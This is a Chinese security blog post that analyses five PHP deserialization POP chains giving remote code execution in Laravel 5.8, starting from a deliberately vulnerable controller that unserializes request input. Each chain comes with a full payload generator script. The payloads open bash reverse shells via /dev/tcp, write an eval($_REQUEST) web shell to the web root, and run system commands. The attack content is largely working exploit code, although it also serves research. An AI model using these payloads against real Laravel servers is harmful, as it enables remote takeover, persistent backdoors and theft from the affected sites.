# Laravel 5.8 RCE POP链汇总分析

阅读量 **932011**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-11-04 16:30:02

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01e9e82d4e87192357.png)

自从phar反序列化的出现，php反序列化的攻击面扩展了不少，框架POP链的挖掘自然得到了重视。这几天整理了 Laravel5.8
能用的POP链，不少前面版本的POP链也还是能用的，在大师傅们的payload基础上修改整理，主要是分析一下提高自己的POP链构造能力。

测试使用的 Laravel 是通过 composer 默认方法 `composer create-project --prefer-dist
laravel/laravel blog "5.8.*"`安装的，如果用到了未默认带的组件会在文中说明。

创建一个控制器

    
    
    class IndexController extends Controller
    {
        public function index(IlluminateHttpRequest $request){
            $payload=$request->input("payload");
            @unserialize($payload);
        }
    }
    

添加路由

    
    
    Route::get('/', "IndexController@index");
    

## POP链1

入口类：`IlluminateBroadcastingpendiongBroadcast`

最后RCE调用类：`FakerGenerator`

从`IlluminateBroadcasting`
PendingBroadcast类的`__destruct`入手，其中event和events都是完全可控的。

![](https://p3.ssl.qhimg.com/t0140e2f89b29112101.png)

然后全局搜索dispatch函数，没有找到合适的函数。全局搜索`__call` 在`Faker`中找到Generator类的`__call`

![](https://p5.ssl.qhimg.com/t012e2adcfddfce7332.png)

跟进，它会调用format函数，其中format会调用call_user_func_array。且第一个参数，由下面的getFormatter返回，我们可以指定`$this->formatters`为数组`array('dispatch'=>'system')`，getFormatter就会返回’system’。

![](https://p0.ssl.qhimg.com/t01b5174cff37ea968e.png)

###  RCE

可以看到，控制了call_user_func_array两个参数，而第二个参数是原来的`$this->event`经过`__call`之后变成了`array($this->event)`，这意味着call_user_func_array第二个参数只能是个单元素的array。当然，这还是能执行system的，因为system必要只一个参数。

下面就是payload:

    
    
    <?php
    
    namespace Faker{
        class Generator
        {
            protected $formatters = array();
            public function __construct($formatters)
            {
                $this->formatters = $formatters;
            }
        }
    }
    
    namespace IlluminateBroadcasting{
        class PendingBroadcast{
            protected $events;
            protected $event;
    
            public function __construct($events, $event)
            {
                $this->events = $events;
                $this->event = $event;
            }
        }
    }
    
    namespace{
        $b = new FakerGenerator(array('dispatch'=>'system'));
        $a = new IlluminateBroadcastingPendingBroadcast($b, "bash -c 'bash -i >& /dev/tcp/127.0.0.1/10012 0>&1'");
        echo urlencode(serialize($a));
    }
    

###  写个SHELL吧

如果靶机禁用了像system这种的危险函数，我们需要使用双参数的函数例如file_put_contents写shell，或者希望执行任意函数，那么上面的payload就没办法了。

解决这个问题师傅们有很多种方案，我自己想了个还算简洁的方法，可以统一解决这个问题。

目前，`call_user_func_array`
第一个参数是完全可控的，这意味着我们可以调用任意类对象的任意方法，那么我们找一个有危险函数的类，并且参数可控就好啦。

搜索寻找`PhpOption/LazyOption`
类中的option函数的call_user_func_array函数中间两个参数都是完全可控的，非常完美的函数。

![](https://p4.ssl.qhimg.com/t01f5020aa391f3d8f8.png)

option函数不接受参数输入，但是LazyOption类其他的函数都是下面这样的，会直接调用option函数。完美！

![](https://p5.ssl.qhimg.com/t0151ba3e68729c8408.png)

最后payload：

    
    
    <?php
    
    namespace Faker{
        class Generator
        {
            protected $formatters = array();
            public function __construct($formatters)
            {
                $this->formatters = $formatters;
            }
        }
    }
    
    namespace IlluminateBroadcasting{
        class PendingBroadcast{
            protected $events;
            protected $event;
    
            public function __construct($events, $event)
            {
                $this->events = $events;
                $this->event = $event;
            }
        }
    }
    
    namespace PhpOption{
        final class LazyOption{
            private $callback;
            private $arguments;
            private $option;
    
            public function __construct($callback, $arguments, $option)
            {
                $this->callback = $callback;
                $this->arguments = $arguments;
                $this->option = $option;
            }
    
        }
    }
    
    
    namespace{
        $c = new PhpOptionLazyOption('file_put_contents', array('/var/www/html/shell.php', '<?php eval($_REQUEST["jrxnm"]);?>'), null);
        $b = new FakerGenerator(array('dispatch'=> array($c, "filter")));
        $a = new IlluminateBroadcastingPendingBroadcast($b, 1);
        echo urlencode(serialize($a));
    }
    

## POP链2

入口类：`IlluminateBroadcastingpendiongBroadcast`

最后RCE调用类：`IlluminateBusDispatcher`

还是从`IlluminateBroadcasting`
PendingBroadcast类的`__destruct`入手，其中event和events都是完全可控的。

![](https://p1.ssl.qhimg.com/t0107f3c2ce23336f96.png)

然后全局搜索dispatch函数，在`IlluminateBusDispatcher`中找到dispatch函数

![](https://p4.ssl.qhimg.com/t01261d75e9878b1cae.png)

当`$this->queueResolver`有值且`$command`是ShouldQueue类的实例

![](https://p2.ssl.qhimg.com/t014d5d740411d3bf57.png)

跟进dispatchToQueue函数

![](https://p0.ssl.qhimg.com/t01fa0dee49a215e59e.png)

赫然一个call_user_func在眼前，第一个参数完全可控。这时，我们又和上面的情况一样了，可以调用任意类对象的任意方法，使用上面同样的LazyOption类，就可以执行任意函数了。

payload：

    
    
    <?php
    
    namespace IlluminateBus{
        class Dispatcher{
            protected $queueResolver;
            public function __construct($queueResolver)
            {
                $this->queueResolver = $queueResolver;
            }
        }
    }
    
    namespace IlluminateEvents{
        class CallQueuedListener{
            protected $connection;
            public function __construct($connection)
            {
                $this->connection = $connection;
            }
        }
    }
    
    namespace IlluminateBroadcasting{
        class PendingBroadcast{
            protected $events;
            protected $event;
    
            public function __construct($events, $event)
            {
                $this->events = $events;
                $this->event = $event;
            }
        }
    }
    
    namespace PhpOption{
        final class LazyOption{
            private $callback;
            private $arguments;
            private $option;
    
            public function __construct($callback, $arguments, $option)
            {
                $this->callback = $callback;
                $this->arguments = $arguments;
                $this->option = $option;
            }
    
        }
    }
    
    
    namespace{
        $c = new PhpOptionLazyOption('system', array('id'), null);
        $d = new IlluminateEventsCallQueuedListener('id');
        $b = new IlluminateBusDispatcher(array($c, 'filter'));
        $a = new IlluminateBroadcastingPendingBroadcast($b, $d);
        echo urlencode(serialize($a));
    }
    

## POP链3

入口类：`IlluminateBroadcastingpendiongBroadcast`

最后RCE调用类：`IlluminateValidationValidator`

这个是在[phpgcc](https://github.com/ambionics/phpggc/)中看见的，虽然标注的可用版本是5.5.39，但经测试直到最新版本5.8.*还是可以用的。接下来继续分析一下。

任然是以`IlluminateBroadcastingpendiongBroadcast`类为入口

![](https://p5.ssl.qhimg.com/t012f28a0254ebd45b3.png)

此时，继续找`__call`函数。在`IlluminateValidationValidator`类的`__call`函数

![](https://p2.ssl.qhimg.com/t01ee6d716d5d75edbd.png)

先进入`$this->callExtension`函数看看

![](https://p3.ssl.qhimg.com/t0103f8378a62611843.png)

可以看到调用call_user_func_array了，其中第一个参数和第二个参数都是可控的，只要前面正常执行下来就可以了。回看`__call`函数

![](https://p3.ssl.qhimg.com/t01f41974c8243e73c2.png)

我们必须确定`$rule`值为多少，才能进入`$this->callExtension`并且后面还牵扯到了call_user_func_array的第一个参数。我们知道在这里我们的`$method`为‘dispatch’，调试代码，发现`$rule`值总为`''`。

![](https://p2.ssl.qhimg.com/t01f5a72203d9b1240e.png)

###  RCE

那么就好办了，call_user_func_array两个参数都可控了，可以执行任意函数

    
    
    <?php
    
    namespace IlluminateBroadcasting{
        class PendingBroadcast{
            protected $events;
            protected $event;
    
            public function __construct($events, $event)
            {
                $this->events = $events;
                $this->event = $event;
            }
        }
    }
    
    namespace IlluminateValidation{
        class Validator{
            protected $extensions;
            public function __construct($extensions)
            {
                $this->extensions = $extensions;
            }
        }
    }
    
    namespace{
        $b = new IlluminateValidationValidator(array(''=>'system'));
        $a = new IlluminateBroadcastingPendingBroadcast($b, 'id');
        echo urlencode(serialize($a));
    }
    

###  写个shell

这里和POP链1的毛病是一样的，这个POP链只能执行只有一个参数的函数，如果向写shell使用file_put_contents等多参数函数就没辙了，解决方法是一样的，下面是payload

    
    
    <?php
    
    namespace IlluminateBroadcasting{
        class PendingBroadcast{
            protected $events;
            protected $event;
    
            public function __construct($events, $event)
            {
                $this->events = $events;
                $this->event = $event;
            }
        }
    }
    
    namespace IlluminateValidation{
        class Validator{
            protected $extensions;
            public function __construct($extensions)
            {
                $this->extensions = $extensions;
            }
        }
    }
    
    namespace PhpOption{
        final class LazyOption{
            private $callback;
            private $arguments;
            private $option;
    
            public function __construct($callback, $arguments, $option)
            {
                $this->callback = $callback;
                $this->arguments = $arguments;
                $this->option = $option;
            }
    
        }
    }
    
    
    namespace{
        $c = new PhpOptionLazyOption('file_put_contents', array('/var/www/html/shell.php', '<?php eval($_REQUEST["jrxnm"]);?>'), null);
        $b = new IlluminateValidationValidator(array(''=>array($c, 'filter')));
        $a = new IlluminateBroadcastingPendingBroadcast($b, '');
        echo urlencode(serialize($a));
    }
    

## POP链4

入口类：`SymfonyComponentCacheAdapterTagAwareAdapter`

最后RCE调用类：`SymfonyComponentCacheAdapterProxyAdapter`

必要组件Symfony，laravel5.7都是默认安装方法自带的。

首先找`__destruct` ，位于`SymfonyComponentCacheAdapterTagAwareAdapter`

![](https://p4.ssl.qhimg.com/t018fd6fa8576ffb26d.png)

依次向下进入invalidateTags函数。

![](https://p1.ssl.qhimg.com/t01ad49c5bb81534195.png)

经过一番简单的操作进入saveDeferred函数，本类的该函数没有啥危害，搜索找到ProxyAdapter类的saveDeferred函数

![](https://p0.ssl.qhimg.com/t014c3e5746ae7e8317.png)

跟进，可以看到下面有个动态函数调用，`$this->setInnerItem`可控，函数的输入`$item`即为上面类的输入也可控，system函数正好可以有两个参数。

![](https://p1.ssl.qhimg.com/t0181ea5de44a3ebaff.png)

其中的 `$item`
本来输入是CacheItemInterface的对象，但是在里面强制转换成了array，也就有了类似`"*expiry"`的键值，其实就是该类的protected属性。

![](https://p2.ssl.qhimg.com/t01a7b751334a60522f.png)

那么这么一顺，POP链差不多就出来了，细节看payload就可以了。

    
    
    namespace SymfonyComponentCacheAdapter{
        class TagAwareAdapter{
            private $deferred;
            private $pool;
            function __construct($deferred, $pool){
                $this->deferred = $deferred;
                $this->pool = $pool;
            }
    
        }
        class ProxyAdapter{
            private $setInnerItem;
            private $poolHash;
            function __construct($setInnerItem, $poolHash){
                $this->setInnerItem = $setInnerItem;
                $this->poolHash = $poolHash;
            }
        }
    }
    
    namespace SymfonyComponentCache{
        final class CacheItem{
            protected $expiry;
            protected $poolHash;
            protected $innerItem;
    
            function __construct($expiry, $poolHash, $innerItem){
                $this->expiry = $expiry;
                $this->poolHash = $poolHash;
                $this->innerItem = $innerItem;
            }
        }
    }
    
    namespace{
        $b = new SymfonyComponentCacheAdapterProxyAdapter('system', 1);
        $d = new SymfonyComponentCacheCacheItem(1, 1, "bash -c 'bash -i >& /dev/tcp/127.0.0.1/9898 0>&1'");
        $a = new SymfonyComponentCacheAdapterTagAwareAdapter(array($d),$b);
        echo urlencode(serialize($a));
    }
    

## POP链5

入口类：`IlluminateFoundationTestingPendingCommand`

这个POP链来自于CVE-2019-9081，虽然当时针对于laravel5.7，同样的payload5.8同样是能用的。这个POP链是最复杂的，本人水平有限，如果分析的不清楚可以去看看[作者本人](https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/)的博客。

现在我们来分析一下这个POP链，首先找到`IlluminateFoundationTestingPendingCommand`类的`__destruct`

![](https://p0.ssl.qhimg.com/t01b31b34a7785fe5b6.png)

跟进run函数，在这个函数的注释中上面赫然写着`Execute the command`

![](https://p2.ssl.qhimg.com/t01847708bbb427972f.png)

哪里可以执行命令呢，根据这个代码结构，确定应该是在try…catch中的`$this->app[Kernel::class]->call($this->command,
$this->parameters);`执行命令。

![](https://p4.ssl.qhimg.com/t01323e59b373f383d7.png)

`$this->app`是什么呢，在注释中看到它是`IlluminateContractsFoundationApplication`的实例

![](https://p3.ssl.qhimg.com/t019474c4649fc3f041.png)

好，先不管它是怎么执行命令的，我们先让代码顺利执行到这的话，必须要顺利走过`$this->mockConsoleOutput();`

![](https://p2.ssl.qhimg.com/t0121fae086674d0de4.png)

跟进

![](https://p5.ssl.qhimg.com/t0123e09aa3c7165964.png)

这部分代码我并没有很好的理解，但是问题不大，只要顺利通过就行。要顺利通过，首先下面这些类属性需要适当的值.

![](https://p5.ssl.qhimg.com/t0119eb3c738ec109a3.png)

`$this-app`上面我们已经分析过了，`$this->parameters`是待会要执行命令的参数，先随便填一个，问题在于`$this->test->expectedOutput`，事实上未找到任何实现了的类中拥有expectedOutput属性的。不过我们还可以使用`__get`魔法函数，在`IlluminateAuthGenericUser`中的`__get`
函数就很好

![](https://p2.ssl.qhimg.com/t01ac58ea99f44c9b61.png)

解决了这几个类属性问题，再去看mockConsoleOutput中还有一个要进入的函数createABufferedOutputMock

![](https://p4.ssl.qhimg.com/t01cfa6160fd55b61ee.png)

跟进，进入函数，`$this->test->expectedOutput`用上面同样的方法解决。后面顺利就能走完这些函数。

![](https://p0.ssl.qhimg.com/t01fee64c0dc1a9c317.png)

回到run函数，接下来就是不好理解的地方了。

`$exitCode = $this->app[Kernel::class]->call($this->command,
$this->parameters);`

上面我们分析过了`$this->app`是`IlluminateContractsFoundationApplication`的实例，`Kernel::class`的值固定为`IlluminateContractsConsoleKernel`

![](https://p0.ssl.qhimg.com/t015d7f96311bb155e2.png)

`$this->app[Kernel::class]`依我的理解，相当于在构建`Kernel::class`类的实例，但是在构建过程中，被作者改变了并执行了call方法。我们跟着payload继续进入。make函数可以直接进入。

![](https://p4.ssl.qhimg.com/t01b95d1ff9a2a9bfa1.png)

进入直到这里，这个函数返回一个`$object`，然后就马上执行后面的call函数，我们能确定在这里实例类对象

![](https://p5.ssl.qhimg.com/t01d1c5b679b3e7233b.png)

最后返回的是`$object`，它从`$concrete`得来，进入getConcrete函数

![](https://p5.ssl.qhimg.com/t01cad0430ac60628d2.png)

前面if语句跳过，`$abstract`是`IlluminateContractsConsoleKernel`，控制`$this->bindings`我们可以返回任意类。在这里POP链作者决定继续返回`IlluminateContractsFoundationApplication`
类（后面就是使用此类父类的call函数执行代码的）

![](https://p2.ssl.qhimg.com/t01135fb3e9dac3aad4.png)

继续往下走，到了实例化类的时候了，进入下面的make，循环一遍，进入build成功实例化类对象。

![](https://p2.ssl.qhimg.com/t01dd3a0ce8b0c2bd8a.png)

进入`IlluminateContractsFoundationApplication`父类call函数

![](https://p1.ssl.qhimg.com/t01d1f68aa20e13b35e.png)

继续跟进，跳过上面的if，着重观察下面匿名函数中call_user_func_array的两个参数，一个`$callback`可控，跟进static::getMethodDependencies函数

![](https://p3.ssl.qhimg.com/t017e64e1a99a442018.png)

getMethodDependencies函数返回`$dependencies`和`$parameters`的合并结果，当`$callback`为system时，`$dependencies`为空。

![](https://p3.ssl.qhimg.com/t011b3735e54012b7b7.png)

那么此时，POP链已经完全构造好了。

payload：

    
    
    <?php
    namespace IlluminateFoundationTesting{
        class PendingCommand{
            protected $command;
            protected $parameters;
            protected $app;
            public $test;
            public function __construct($command, $parameters,$class,$app){
                $this->command = $command;
                $this->parameters = $parameters;
                $this->test=$class;
                $this->app=$app;
            }
        }
    }
    namespace IlluminateAuth{
        class GenericUser{
            protected $attributes;
            public function __construct(array $attributes){
                $this->attributes = $attributes;
            }
        }
    }
    
    namespace IlluminateFoundation{
        class Application{
            protected $hasBeenBootstrapped = false;
            protected $bindings;
            public function __construct($bind){
                $this->bindings=$bind;
            }
        }
    }
    namespace{
        $genericuser = new IlluminateAuthGenericUser(array("expectedOutput"=>array(),"expectedQuestions"=>array()));
        $application = new IlluminateFoundationApplication(array("IlluminateContractsConsoleKernel"=>array("concrete"=>"IlluminateFoundationApplication")));
        $pendingcommand = new IlluminateFoundationTestingPendingCommand("system",array('id'),$genericuser,$application);
        echo urlencode(serialize($pendingcommand));
    }
    ?>
    

## 总结

可以看到，这些POP链有很多是基于`IlluminateBroadcastingpendiongBroadcast`入口的，当然这也意味着如果有更多的入口，这后面的RCE也是可以继续使用的。

上面构造POP链用了很多tricks，比如调用不存在的方法去找`__call`，参数不存在去找`__get`（可以考虑IlluminateAuthGenericUser的`__get`），可以任意执行某个类实例的某个方法时可以考虑`PhpOption/LazyOption`类。这些gadget遇到类似问题时拿来都是可以直接用的，通篇分析下来，感觉自己对laravel框架也更熟了一些。

最后pop链都整合在这<https://github.com/SZFsir/laravel_POP_RCE> ，有兴趣的可以一起复现一下。

## 参考

<https://laworigin.github.io/2019/02/21/laravelv5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96rce/>

<https://xz.aliyun.com/t/5911>

<http://m4p1e.com/web/20181224.html>

<https://github.com/ambionics/phpggc>

<https://xz.aliyun.com/t/5483>

<https://xz.aliyun.com/t/2901>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **JrXnm** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/189718](/post/id/189718)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [反序列化](/tag/反序列化)
  * [Laravel](/tag/Laravel)
  * [POP](/tag/POP)

 **+1** __11赞

 __收藏

![](https://p5.ssl.qhimg.com/t01aab9f062b9888337.png) JrXnm

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

